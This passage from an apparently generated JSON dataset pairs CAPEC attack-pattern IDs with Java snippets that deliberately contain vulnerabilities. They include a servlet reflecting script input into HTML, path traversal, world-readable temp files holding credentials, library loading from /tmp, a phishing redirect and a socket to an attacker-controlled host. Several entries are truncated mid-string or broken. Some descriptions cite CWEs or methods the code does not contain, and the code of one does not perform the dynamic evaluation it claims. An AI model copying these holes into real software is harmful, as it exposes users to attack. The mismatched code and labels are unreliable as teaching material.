        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class InsecureTempFile {\n    public static void main(String[] args) {\n        try {\n            // CWE-377: Insecure Temporary File\n            File tempFile = File.createTempFile(\"temp\", \".txt\");\n            tempFile.setReadable(true, false);\n            tempFile.setWritable(true, false);\n\n            // CWE-524: Use of Cache Containing Sensitive Information\n            String sensitiveData = \"username:password\";\n            FileWriter writer = new FileWriter(tempFile);\n            writer.write(sensitiveData);\n            writer.close();\n\n            // CWE-379: Creation of Temporary File in Directory with Insecure Permissions\n            File tempDir = new File(\"/tmp/tempDir\");\n            tempDir.setExecutable(true, false);\n            tempDir.setReadable(true, false);\n            tempFile = new File(tempDir, \"temp.txt\");\n\n            // CWE-378: Creation of Temporary File With Insecure Permissions\n            tempFile.setReadable(true, false);\n            tempFile.setWritable(true, false);\n\n            // CWE-219: Storage of File with Sensitive Data Under Web Root\n            String webRoot = \"/var/www/html\";\n            tempDir = new File(webRoot, \"tempDir\");\n            tempFile = new File(tempDir, \"temp.txt\");\n        } catch (IOException e) {\n            System.out.println(\"Error creating temporary file\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of exploiting temporary, insecure storage of information. It creates a temporary file with insecure permissions, stores sensitive data in the file, and places it in a directory with insecure permissions, including under the web root. This allows an adversary to potentially access the sensitive information."
    },
    {
        "capec_id": "157",
        "code_snippet": "import java.net.Socket;\nimport java.net.ServerSocket;\nimport java.io.DataInputStream;\nimport java.io.DataOutputStream;\nimport java.io.IOException;\n\npublic class SniffingAttack {\n    public static void main(String[] args) throws IOException {\n        ServerSocket serverSocket = new ServerSocket(8000);\n        Socket socket = serverSocket.accept();\n        DataInputStream dataInputStream = new DataInputStream(socket.getInputStream());\n        DataOutputStream dataOutputStream = new DataOutputStream(socket.getOutputStream());\n\n        // CWE-311: Missing Encryption of Sensitive Data\n        String sensitiveData = \\",
        "description": "This Java code snippet demonstrates a sniffing attack by transmitting sensitive data in cleartext over a network socket, without encryption or message integrity checks, making it vulnerable to interception and eavesdropping by an adversary."
    },
    {
        "capec_id": "158",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class SniffingAttack {\n    public static void main(String[] args) throws Exception {\n        DatagramSocket socket = new DatagramSocket(8000);\n        byte[] buffer = new byte[1024];\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n\n        while (true) {\n            socket.receive(packet);\n            String data = new String(packet.getData(), 0, packet.getLength());\n            System.out.println(\"Captured packet: \" + data);\n\n            // CWE-311: Missing Encryption of Sensitive Data\n            String sensitiveData = \"username:password\";\n            socket.send(new DatagramPacket(sensitiveData.getBytes(), sensitiveData.getBytes().length, packet.getSocketAddress()));\n\n            // CWE-319: Cleartext Transmission of Sensitive Information\n            String cleartextData = \"creditCardNumber:1234-5678-9012-3456\";\n            socket.send(new DatagramPacket(cleartextData.getBytes(), cleartextData.getBytes().length, packet.getSocketAddress()));\n\n            // CWE-406: Insufficient Control of Network Message Volume (Network Amplification)\n            for (int i = 0; i < 100; i++) {\n                socket.send(new DatagramPacket(\"Amplified packet\".getBytes(), \"Amplified packet\".getBytes().length, packet.getSocketAddress()));\n            }\n\n            // CWE-294: Authentication Bypass by Capture-replay\n            String capturedAuthPacket = \"captured authentication packet\";\n            socket.send(new DatagramPacket(capturedAuthPacket.getBytes(), capturedAuthPacket.getBytes().length, packet.getSocketAddress()));\n\n            // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n            String systemInfo = \"System information: \" + System.getProperty(\"os.name\") + \", \" + System.getProperty(\"os.version\");\n            socket.send(new DatagramPacket(systemInfo.getBytes(), systemInfo.getBytes().length, packet.getSocketAddress()));\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a network sniffing attack, which captures and analyzes network traffic between nodes. It includes examples of CWEs 311, 319, 406, 294, and 497, showcasing vulnerabilities such as missing encryption, cleartext transmission, insufficient control of network message volume, authentication bypass by capture-replay, and exposure of sensitive system information."
    },
    {
        "capec_id": "159",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.lang.System;\n\npublic class VulnerableCode {\n    public static void main(String[] args) {\n        String libPath = System.getProperty(\"java.library.path\");\n        String[] paths = libPath.split(\":\");\n        String maliciousLibPath = \"/tmp/malicious_lib\";\n        String maliciousLibName = \"libmalicious.so\";\n        \n        // CWE-73: External Control of File Name or Path\n        String userSuppliedPath = args[0];\n        File f = new File(userSuppliedPath);\n        if (f.isDirectory()) {\n            // CWE-427: Uncontrolled Search Path Element\n            System.setProperty(\"java.library.path\", userSuppliedPath);\n        }\n        \n        try {\n            // CWE-706: Use of Incorrectly-Resolved Name or Reference\n            System.load(maliciousLibPath + \"/\" + maliciousLibName);\n        } catch (UnsatisfiedLinkError e) {\n            System.out.println(\"Error loading library: \" + e.getMessage());\n        }\n        \n        // CWE-426: Untrusted Search Path\n        String searchPath = System.getProperty(\"java.library.path\");\n        System.out.println(\"Search path: \" + searchPath);\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC pattern of exploiting weaknesses in the way an application searches for external libraries. The code allows an adversary to manipulate the execution flow by redirecting the application's attempts to access external libraries to a malicious library. The code uses untrusted search paths, external control of file names or paths, and incorrectly-resolved names or references, making it vulnerable to attacks."
    },
    {
        "capec_id": "160",
        "code_snippet": "public class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        String script = req.getParameter(\"script\");\n        resp.setContentType(\"text/html\");\n        PrintWriter out = resp.getWriter();\n        out.println(\"<html><body><script>\" + script + \"</script></body></html>\");\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable servlet that takes a script parameter from the HTTP request and injects it into the HTML response without proper validation or neutralization, allowing an attacker to inject malicious scripts and potentially leading to cross-site scripting (XSS) attacks."
    },
    {
        "capec_id": "161",
        "code_snippet": "import java.net.Socket;\nimport java.net.InetSocketAddress;\nimport java.io.DataOutputStream;\nimport java.io.DataInputStream;\n\npublic class PharmingAttack {\n    public static void main(String[] args) throws Exception {\n        // CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n        Socket socket = new Socket();\n        socket.connect(new InetSocketAddress(\"attacker-controlled-server.com\", 80));\n\n        // CWE-941: Incorrectly Specified Destination in a Communication Channel\n        DataOutputStream dout = new DataOutputStream(socket.getOutputStream());\n        dout.writeUTF(\"https://bank.com/login\");\n\n        // CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n        DataInputStream din = new DataInputStream(socket.getInputStream());\n        String response = din.readUTF();\n        System.out.println(response);\n\n        // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n        System.out.println(System.getProperty(\"os.name\"));\n    }\n}\n",
        "description": "This Java code snippet demonstrates a Pharming attack, where an attacker redirects a user's request to a fake server controlled by the attacker, instead of the intended bank server. The code establishes a socket connection to the attacker-controlled server, sends a request to the fake server, and receives a response. The code also exposes sensitive system information to an unauthorized control sphere."
    },
    {
        "capec_id": "162",
        "code_snippet": "public class EShopliftingExample {\n    public static void processOrder(HttpServletRequest request) {\n        String price = request.getParameter(\"price\");\n        String quantity = request.getParameter(\"quantity\");\n        String discount = request.getParameter(\"discount\");\n        \n        // CWE-602: Client-Side Enforcement of Server-Side Security\n        // CWE-807: Reliance on Untrusted Inputs in a Security Decision\n        // CWE-472: External Control of Assumed-Immutable Web Parameter\n        // CWE-922: Insecure Storage of Sensitive Information\n        // CWE-639: Authorization Bypass Through User-Controlled Key\n        \n        double totalPrice = Double.parseDouble(price) * Integer.parseInt(quantity);\n        totalPrice -= (totalPrice * Double.parseDouble(discount) / 100);\n        \n        // Process the order with the modified price\n        System.out.println(\"Order processed with total price: \" + totalPrice);\n    }\n}\n",
        "description": "This Java code snippet demonstrates the EShoplifting attack, where an adversary modifies the price, quantity, or discount fields in an HTML form response to acquire items at a lower cost than intended. The server-side code trusts the client-side input and uses it to calculate the total price, without proper validation or verification."
    },
    {
        "capec_id": "163",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.http.*;\n\npublic class PhishingServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse res) throws IOException {\n        String targetUrl = req.getParameter(\"targetUrl\");\n        String userEmail = req.getParameter(\"userEmail\");\n        String userName = req.getParameter(\"userName\");\n\n        // CWE-451: Misrepresenting critical information\n        String phishingUrl = \"https://example.com/phishing-site\";\n        String phishingMessage = \"Dear \" + userName + \",\\n\\nYour account has been compromised. Please click on this link to reset your password: \" + phishingUrl;\n\n        // CWE-601: URL Redirection to Untrusted Site\n        res.sendRedirect(phishingUrl);\n\n        // CWE-301: Reflection Attack in an Authentication Protocol\n        // (not directly applicable in this example, but could be used in conjunction with phishing attacks)\n\n        // CWE-942: Permissive Cross-domain Policy with Untrusted Domains\n        // (not directly applicable in this example, but could be used to allow the phishing site to access the user's data)\n\n        // CWE-1022: Use of Web Link to Untrusted Target with window.opener Access\n        // (not directly applicable in this example, but could be used to allow the phishing site to access the user's data)\n    }\n}",
        "description": "This Java code snippet demonstrates a phishing attack (CAPEC-98) by sending a targeted email to a user with a link to a phishing site. The email appears to come from a trusted entity and contains information specific to the user to increase the likelihood of the user following the link. The code uses CWE-451 to misrepresent critical information, CWE-601 to redirect the user to an untrusted site, and could be used in conjunction with CWE-301, CWE-942, and CWE-1022 to further compromise the user's security."
    },
    {
        "capec_id": "164",
        "code_snippet": "public class MobilePhishingAttack {\n    public static void main(String[] args) {\n        // CWE-451: User Interface (UI) Misrepresentation of Critical Information\n        String phishingMessage = \"Your account has been compromised. Click this link to reset your password: http://phishing-site.com/reset\";\n        System.out.println(phishingMessage);\n\n        // CWE-290: Authentication Bypass by Spoofing\n        String spoofedUsername = \"admin\";\n        String spoofedPassword = \"password\";\n        authenticateUser(spoofedUsername, spoofedPassword);\n\n        // CWE-307: Improper Restriction of Excessive Authentication Attempts\n        for (int i = 0; i < 100; i++) {\n            authenticateUser(\"user\", \"wrongpassword\" + i);\n        }\n\n        // CWE-309: Use of Password System for Primary Authentication\n        String password = \"password\";\n        if (password.equals(\"password\")) {\n            System.out.println(\"Authenticated!\");\n        }\n\n        // CWE-308: Use of Single-factor Authentication\n        String username = \"user\";\n        String passwordSingleFactor = \"password\";\n        if (username.equals(\"user\") && passwordSingleFactor.equals(\"password\")) {\n            System.out.println(\"Authenticated with single-factor authentication!\");\n        }\n    }\n\n    public static void authenticateUser(String username, String password) {\n        // Insecure authentication logic\n        if (username.equals(\"admin\") && password.equals(\"password\")) {\n            System.out.println(\"Authenticated!\");\n        } else {\n            System.out.println(\"Invalid credentials.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a mobile phishing attack, which is a variation of the phishing social engineering technique. It includes vulnerabilities such as user interface misrepresentation, authentication bypass by spoofing, improper restriction of excessive authentication attempts, use of password system for primary authentication, and use of single-factor authentication."
    },
    {
        "capec_id": "165",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class FileManipulationVulnerability {\n    public static void processFile(String filePath) throws IOException {\n        File file = new File(filePath);\n        if (file.exists()) {\n            // CWE-646: Reliance on File Name or Extension of Externally-Supplied File\n            if (filePath.endsWith(\".txt\")) {\n                // process as text file\n            } else if (filePath.endsWith(\".exe\")) {\n                // process as executable file\n            }\n            // CWE-73: External Control of File Name or Path\n            File tempFile = new File(\"temp\" + filePath);\n            FileWriter writer = new FileWriter(tempFile);\n            writer.write(\"This is a temporary file\");\n            writer.close();\n            // CWE-377: Insecure Temporary File\n            // CWE-99: Improper Control of Resource Identifiers ('Resource Injection')\n            // CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\n            String restrictedDir = \"../restricted/\";\n            File restrictedFile = new File(restrictedDir + filePath);\n            if (restrictedFile.exists()) {\n                // process restricted file\n            }\n        }\n    }\n    public static void main(String[] args) throws IOException {\n        processFile(\"user-inputted-file-path\");\n    }\n}",
        "description": "This Java code snippet demonstrates a file manipulation vulnerability, where an attacker can modify file contents or attributes to cause incorrect processing by the application. The code allows user input to control file names and paths, relies on file extensions to determine processing, and creates insecure temporary files. It also demonstrates path traversal vulnerabilities by constructing a pathname with user-inputted data."
    },
    {
        "capec_id": "166",
        "code_snippet": "public class PowerSaveRestore { \n    private boolean isLocked = false; \n    private boolean isAdmin = false; \n    private int securitySetting = 0; \n\n    public void saveState() { \n        // CWE-306: Missing Authentication for Critical Function \n        if (!isAdmin) { \n            System.out.println(\"Warning: Unauthorized access to saveState function.\"); \n            return; \n        } \n\n        // CWE-1221: Incorrect Register Defaults or Module Parameters \n        // CWE-1271: Uninitialized Value on Reset for Registers Holding Security Settings \n        securitySetting = 0; \n\n        // CWE-1232: Improper Lock Behavior After Power State Transition \n        isLocked = false; \n    } \n\n    public void restoreState() { \n        // CWE-1304: Improperly Preserved Integrity of Hardware Configuration State During a Power Save/Restore Operation \n        if (!isLocked) { \n            System.out.println(\"Warning: Configuration state is not locked.\"); \n            return; \n        } \n\n        // CWE-306: Missing Authentication for Critical Function \n        if (!isAdmin) { \n            System.out.println(\"Warning: Unauthorized access to restoreState function.\"); \n            return; \n        } \n\n        // CWE-1221: Incorrect Register Defaults or Module Parameters \n        // CWE-1271: Uninitialized Value on Reset for Registers Holding Security Settings \n        securitySetting = 1; \n    } \n}",
        "description": "This Java code snippet demonstrates the CAPEC of forcing a target into a previous state to leverage potential weaknesses. It includes CWE-306 (Missing Authentication for Critical Function), CWE-1221 (Incorrect Register Defaults or Module Parameters), CWE-1232 (Improper Lock Behavior After Power State Transition), CWE-1271 (Uninitialized Value on Reset for Registers Holding Security Settings), and CWE-1304 (Improperly Preserved Integrity of Hardware Configuration State During a Power Save/Restore Operation). The code has a PowerSaveRestore class with saveState and restoreState functions that do not properly authenticate users, initialize security settings, or maintain the integrity of the configuration state during power save/restore operations."
    },
    {
        "capec_id": "167",
        "code_snippet": "public class SoCAnalyzer {\n    public static void main(String[] args) {\n        // CWE-1323: Improper Management of Sensitive Trace Data\n        String traceData = getTraceDataFromSoC();\n        System.out.println(traceData);\n\n        // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n        System.out.println(System.getProperty(\"os.name\"));\n        System.out.println(System.getProperty(\"os.version\"));\n\n        // CWE-506: Embedded Malicious Code\n        if (isDebugMode()) {\n            executeMaliciousCode();\n        }\n\n        // CWE-1037: Processor Optimization Removal or Modification of Security-critical Code\n        int secureVariable = 0;\n        if (isSecureMode()) {\n            secureVariable = 1;\n        }\n        System.out.println(secureVariable);\n\n        // CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\n        if (isTestMode()) {\n            activateTestLogic();\n        }\n    }\n\n    private static String getTraceDataFromSoC() {\n        // Return trace data from SoC\n        return \"Trace data from SoC\";\n    }\n\n    private static boolean isDebugMode() {\n        // Check if debug mode is enabled\n        return true;\n    }\n\n    private static void executeMaliciousCode() {\n        // Execute malicious code\n        System.out.println(\"Malicious code executed\");\n    }\n\n    private static boolean isSecureMode() {\n        // Check if secure mode is enabled\n        return true;\n    }\n\n    private static boolean isTestMode() {\n        // Check if test mode is enabled\n        return true;\n    }\n\n    private static void activateTestLogic() {\n        // Activate test logic\n        System.out.println(\"Test logic activated\");\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of white box analysis techniques to discover the structure, function, and composition of a type of computer software. It includes CWEs such as improper management of sensitive trace data, exposure of sensitive system information, embedded malicious code, processor optimization removal or modification of security-critical code, and hardware allows activation of test or debug logic at runtime."
    },
    {
        "capec_id": "168",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.nio.file.StandardCopyOption;\n\npublic class ADSExploit {\n    public static void main(String[] args) throws IOException {\n        // CWE-212: Improper Removal of Sensitive Information Before Storage or Transfer\n        String sensitiveData = \"top_secret_info\";\n        File file = new File(\"example.txt\");\n        Files.write(Paths.get(file.getAbsolutePath() + \":malicious_stream\"), sensitiveData.getBytes());\n\n        // CWE-69: Improper Handling of Windows ::DATA Alternate Data Stream\n        File maliciousFile = new File(\"malicious_file.exe\");\n        Files.copy(Paths.get(maliciousFile.getAbsolutePath()), Paths.get(file.getAbsolutePath() + \":malicious_stream\"), StandardCopyOption.REPLACE_EXISTING);\n\n        // CWE-1386: Insecure Operation on Windows Junction / Mount Point\n        File junctionPoint = new File(\"C:\\\\junction_point\");\n        Files.createSymbolicLink(Paths.get(junctionPoint.getAbsolutePath()), Paths.get(\"C:\\\\malicious_directory\"));\n\n        // CWE-427: Uncontrolled Search Path Element\n        System.setProperty(\"java.library.path\", \"C:\\\\malicious_library\");\n\n        // CWE-58: Path Equivalence: Windows 8.3 Filename\n        File shortFilename = new File(\"SHORTN~1.TXT\");\n        Files.write(Paths.get(shortFilename.getAbsolutePath()), \"malicious_content\".getBytes());\n    }\n}",
        "description": "This Java code snippet demonstrates the exploitation of Microsoft NTFS Alternate Data Streams (ADS) to hide sensitive information and malicious files. It creates an ADS stream with sensitive data, copies a malicious file to the ADS, creates a junction point to a malicious directory, sets an uncontrolled search path element, and exploits path equivalence with a short 8.3 filename."
    },
    {
        "capec_id": "169",
        "code_snippet": "public class InformationExposer {\n    private String sensitiveData = \"TopSecret\";\n    \n    public void exposeInformation() {\n        System.out.println(\"System Information: \" + System.getProperty(\"os.name\"));\n        System.out.println(\"Java Version: \" + System.getProperty(\"java.version\"));\n        System.out.println(\"Sensitive Data: \" + sensitiveData);\n    }\n    \n    public void truncateSecurityInfo() {\n        String securityLog = \"Attack detected from 192.168.1.1 at 2022-01-01 12:00:00\";\n        System.out.println(securityLog.substring(0, 20));\n    }\n    \n    public void behaveDifferently() {\n        if (System.getProperty(\"os.name\").equals(\"Windows\")) {\n            System.out.println(\"Running on Windows\");\n        } else {\n            System.out.println(\"Running on non-Windows\");\n        }\n    }\n    \n    public void createEmergentResource() {\n        Runtime.getRuntime().exec(\"mkdir C:\\\\temp\\\\vulnerable_resource\");\n    }\n    \n    public static void main(String[] args) {\n        InformationExposer exposer = new InformationExposer();\n        exposer.exposeInformation();\n        exposer.truncateSecurityInfo();\n        exposer.behaveDifferently();\n        exposer.createEmergentResource();\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of probing and exploration to identify constituents and properties of the target. It includes various CWEs, such as exposure of sensitive information (CWE-200), truncation of security-relevant information (CWE-222), observable behavioral discrepancy (CWE-205 and CWE-207), and creation of emergent resource (CWE-1229). The code exposes system information, sensitive data, and behaves differently based on the operating system, while also truncating security logs and creating a new resource that can be exploited by attackers."
    },
    {
        "capec_id": "170",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class VersionDisclosureServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n        String userAgent = req.getHeader(\"User-Agent\");\n        String version = req.getServerInfo();\n        resp.setStatus(200);\n        resp.setContentType(\"text/plain\");\n        resp.getWriter().write(\"User-Agent: \" + userAgent + \"\\nServer Version: \" + version);\n    }\n}\n\nimport java.io.File;\nimport java.io.IOException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class SensitiveInfoDisclosureServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n        String path = req.getServletContext().getRealPath(\"/\");\n        File file = new File(path);\n        String[] files = file.list();\n        resp.setStatus(200);\n        resp.setContentType(\"text/plain\");\n        resp.getWriter().write(\"Directory Structure:\\n\");\n        for (String f : files) {\n            resp.getWriter().write(f + \"\\n\");\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a web application that discloses sensitive information, including server version and directory structure, to an unauthorized control sphere. The first servlet, VersionDisclosureServlet, responds to GET requests with the User-Agent header and server version. The second servlet, SensitiveInfoDisclosureServlet, lists the files in the root directory of the application. This code embodies the CAPEC of web application fingerprinting, which can be used to formulate a targeted attack plan. The related CWEs include 497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere), 598 (Use of GET Request Method With Sensitive Query Strings), 1125 (Excessive Attack Surface), 209 (Generation of Error Message Containing Sensitive Information), and 494 (Download of Code Without Integrity Check)."
    },
    {
        "capec_id": "171",
        "code_snippet": "public class DynamicEvaluation { \n public static void main(String[] args) { \n String userInput = \"x\"; \n String evalString = \"int \" + userInput + \" = 10;\"; \n try { \n Class<?> clazz = Class.forName(\"DynamicEvaluation\"); \n clazz.getDeclaredField(userInput).setAccessible(true); \n } catch (Exception e) { \n System.out.println(\"Error: \" + e.getMessage()); \n } \n } \n }",
        "description": "This Java code snippet demonstrates the CAPEC-77 attack pattern, which involves manipulating user-controlled variables. The code dynamically constructs a string for evaluation, using user input to determine the variable name. This allows an attacker to access arbitrary variables or functions, as described in CWE-627. The code also exhibits CWE-914, CWE-913, CWE-1126, and CWE-95, as it does not properly restrict access to dynamically-identified variables, does not neutralize code syntax before dynamic evaluation, and declares variables with unnecessarily wide scope."
    },
    {
        "capec_id": "173",
        "code_snippet": "import java.awt.Desktop;\nimport java.io.IOException;\nimport java.net.URI;\n\npublic class ClickjackingAttack {\n    public static void main(String[] args) {\n        String url = \"https://example.com/malicious-site\";\n        String buttonText = \"Submit Query\";\n        // Create a button that appears to submit a query but actually downloads software\n        javax.swing.JButton button = new javax.swing.JButton(buttonText);\n        button.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent e) {\n                try {\n                    // Open the malicious site in the background\n                    Desktop.getDesktop().browse(new URI(url));\n                } catch (IOException ex) {\n                    // Handle exception\n                }\n            }\n        });\n    }\n}\n",
        "description": "This Java code snippet demonstrates a clickjacking attack, where a user is tricked into clicking a button that appears to submit a query but actually downloads software from a malicious site. The code uses a JButton with a misleading label and an ActionListener that opens the malicious site in the background when clicked, illustrating CWE-451 (User Interface Misrepresentation of Critical Information), CWE-290 (Authentication Bypass by Spoofing), CWE-941 (Incorrectly Specified Destination in a Communication Channel), CWE-925 (Improper Verification of Intent by Broadcast Receiver), and CWE-618 (Exposed Unsafe ActiveX Method)."
    },
    {
        "capec_id": "174",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.io.PrintWriter;\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class FlashFileUploadServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response)\n            throws ServletException, IOException {\n        String filePath = request.getParameter(\"filePath\");\n        String fileContent = request.getParameter(\"fileContent\");\n        File file = new File(filePath);\n        PrintWriter writer = new PrintWriter(file);\n        writer.println(fileContent);\n        writer.close();\n        response.setStatus(200);\n    }\n}\n\n// Somewhere in the HTML file\n<object type=\"application/x-shockwave-flash\" data=\"flash.swf\">\n    <param name=\"flashvars\" value=\"configXML=<http://example.com/config.xml>\">\n</object>\n\n// config.xml\n<cross-domain-policy>\n    <allow-access-from domain=\"*\"/>\n</cross-domain-policy>\n",
        "description": "This Java code snippet demonstrates a vulnerable Flash file upload servlet that allows an attacker to inject malicious global parameters into a Flash file embedded within an HTML document. The servlet does not properly validate the file path and content, allowing an attacker to upload a malicious Flash file. The HTML file uses the Flash file and specifies a cross-domain policy file that allows access from all domains, making it vulnerable to cross-site request forgery (CSRF) attacks. The cross-domain policy file is also vulnerable to improper neutralization of special elements used in a template engine."
    },
    {
        "capec_id": "175",
        "code_snippet": "import java.io.File;\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\nimport java.lang.reflect.Method;\n\npublic class CodeInclusionVulnerability {\n    public static void main(String[] args) throws Exception {\n        String filename = \"user-inputted-filename\";\n        File file = new File(filename);\n        if (file.exists()) {\n            FileInputStream fis = new FileInputStream(file);\n            byte[] bytes = new byte[(int) file.length()];\n            fis.read(bytes);\n            fis.close();\n            Class<?> clazz = new MyClassLoader().loadClass(\"DynamicClass\");\n            Method method = clazz.getMethod(\"execute\");\n            method.invoke(clazz.newInstance());\n        }\n    }\n}\n\nclass MyClassLoader extends ClassLoader {\n    @Override\n    public Class<?> loadClass(String name) throws ClassNotFoundException {\n        return super.loadClass(name);\n    }\n    @Override\n    protected Class<?> findClass(String name) throws ClassNotFoundException {\n        byte[] bytes = loadClassBytes(name);\n        return defineClass(name, bytes, 0, bytes.length);\n    }\n    private byte[] loadClassBytes(String name) throws ClassNotFoundException {\n        // Load the class bytes from the file\n        return new byte[0];\n    }\n}\n",
        "description": "This Java code snippet demonstrates a code inclusion vulnerability. It loads a class from a file specified by user input, which can be a malicious file. The loaded class is then executed, allowing an attacker to inject and execute arbitrary code. This code includes functionality from an untrusted control sphere (CWE-829), contains embedded malicious code (CWE-506), and improperly controls the generation of code (CWE-94)."
    },
    {
        "capec_id": "176",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class ConfigurationManipulation {\n    public static void main(String[] args) {\n        try {\n            // CWE-15: External Control of System or Configuration Setting\n            String configPath = \"/path/to/config/file\";\n            File configFile = new File(configPath);\n            FileWriter writer = new FileWriter(configFile);\n            writer.write(\"malicious_config_data\");\n            writer.close();\n\n            // CWE-1233: Security-Sensitive Hardware Controls with Missing Lock Bit Protection\n            // CWE-1234: Hardware Internal or Debug Modes Allow Override of Locks\n            // CWE-1304: Improperly Preserved Integrity of Hardware Configuration State During a Power Save/Restore Operation\n            // CWE-1328: Security Version Number Mutable to Older Versions\n            System.out.println(\"Modified configuration file to manipulate application behavior\");\n        } catch (IOException e) {\n            System.out.println(\"Error modifying configuration file: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a configuration manipulation attack, where an attacker modifies an external configuration file to affect the behavior of a target application. The code writes malicious data to a configuration file, which can potentially allow an attacker to control system settings or configuration elements, bypass security controls, or downgrade security versions."
    },
    {
        "capec_id": "177",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\n\npublic class FileLocationVulnerability {\n    public static void main(String[] args) {\n        String filename = \"config.txt\";\n        String path = \"./\";\n        File file = new File(path + filename);\n        if (file.exists()) {\n            // Load the file, assuming it's the legitimate one\n            loadConfigFile(file);\n        } else {\n            System.out.println(\"File not found\");\n        }\n    }\n\n    public static void loadConfigFile(File file) {\n        // Load the file, without verifying its origin or location\n        try {\n            // Assume this method loads the file's content\n            System.out.println(\"Loaded file: \" + file.getAbsolutePath());\n        } catch (Exception e) {\n            System.out.println(\"Error loading file: \" + e.getMessage());\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a file location vulnerability, where an attacker can create a malicious file with the same name as a protected or privileged file, and place it in a directory that the application will search before the directory with the legitimate file. The application loads the file without verifying its origin or location, making it vulnerable to manipulation."
    },
    {
        "capec_id": "178",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class FlashRedirectServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        String url = req.getParameter(\"url\");\n        String flashVars = req.getParameter(\"flashVars\");\n        resp.sendRedirect(\"http://example.com/flash.swf?\" + flashVars + \"&url=\" + url);\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable Flash redirect servlet. It takes a 'url' and 'flashVars' parameter from the request, and redirects the user to a Flash document with the provided parameters. This allows an attacker to control the Flash document's behavior and potentially execute malicious instructions. The code is vulnerable to CWE-601 (Open Redirect), CWE-79 (Cross-site Scripting), CWE-942 (Permissive Cross-domain Policy with Untrusted Domains), CWE-1022 (Use of Web Link to Untrusted Target with window.opener Access), and CWE-644 (Improper Neutralization of HTTP Headers for Scripting Syntax)."
    },
    {
        "capec_id": "179",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.http.Cookie;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class MicroServiceServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n        String sensitiveData = req.getQueryString();\n        Cookie cookie = new Cookie(\\",
        "description": "This Java code snippet demonstrates a vulnerable micro-service implementation that exposes sensitive information and allows an attacker to discover and query micro-services. The doGet method uses the HTTP GET request method with sensitive query strings (CWE-598) and stores sensitive data in persistent cookies (CWE-539). The getMicroServiceContent method reads micro-service content from a file under the web document root without proper access control (CWE-219 and CWE-433), making it accessible to untrusted parties. The code relies on the client to implement security mechanisms, which is an example of client-side enforcement of server-side security (CWE-602)."
    },
    {
        "capec_id": "180",
